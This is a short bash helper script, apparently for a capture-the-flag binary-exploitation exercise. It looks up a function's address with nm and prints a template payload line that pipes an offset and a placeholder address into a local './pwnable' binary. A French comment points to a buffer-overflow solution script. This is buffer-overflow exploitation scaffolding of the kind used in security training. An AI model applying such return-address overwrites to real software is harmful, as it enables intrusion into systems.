#!/bin/bash

echo "Adress of the functio '???' in big endian :"
nm -g -C "$1" | grep "???" | cut -d' ' -f1

echo 'echo -ne "offset\xad\xdr\xin\xli\xtl\xen\xdi\xan" | ./pwnable'
echo 'Le shell se referme ? voir ../buffer_overflow/solution.sh'

